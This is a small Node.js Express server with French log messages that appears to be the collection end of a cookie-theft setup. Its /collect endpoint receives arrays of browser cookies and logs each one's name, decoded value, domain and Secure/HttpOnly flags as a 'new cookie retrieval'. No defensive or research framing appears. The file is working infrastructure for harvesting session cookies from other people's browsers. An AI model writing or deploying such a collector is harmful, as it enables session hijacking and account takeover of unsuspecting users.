const express = require("express");
const app = express();

app.use(express.json());

function safeDecode(value) {
  try {
    return decodeURIComponent(value);
  } catch {
    return value;
  }
}

app.post("/collect", (req, res) => {
  const cookies = req.body.cookies;
  const now = new Date();

  console.log("\n\n========================================");
  console.log("🍪 NOUVELLE RÉCUPÉRATION DE COOKIES");
  console.log("📅 Date :", now.toLocaleDateString("fr-FR"));
  console.log("⏰ Heure:", now.toLocaleTimeString("fr-FR"));
  console.log("========================================");

  if (!Array.isArray(cookies)) {
    console.log("❌ ERREUR : cookies n'est pas un tableau");
    console.log("Reçu :", cookies);
    console.log("========================================\n");
    return res.json({ status: "error" });
  }

  cookies.forEach((cookie, index) => {
    console.log("\n----------------------------------------");
    console.log(`🍪 COOKIE ${index + 1}`);
    console.log("----------------------------------------");
    console.log("Nom       :", cookie.name);
    console.log("Valeur    :", safeDecode(cookie.value || ""));
    console.log("Domaine   :", cookie.domain);
    console.log("Path      :", cookie.path);
    console.log("Secure    :", cookie.secure);
    console.log("HttpOnly  :", cookie.httpOnly);
  });

  console.log("\n========================================");
  console.log(`✅ ${cookies.length} cookie(s) reçus`);
  console.log("========================================\n");

  res.json({ status: "ok" });
});

app.get("/", (req, res) => {
  res.send("Le serveur fonctionne !");
});

const PORT = process.env.PORT || 10000;
app.listen(PORT, () => {
  console.log(`Server running on port ${PORT}`);
});
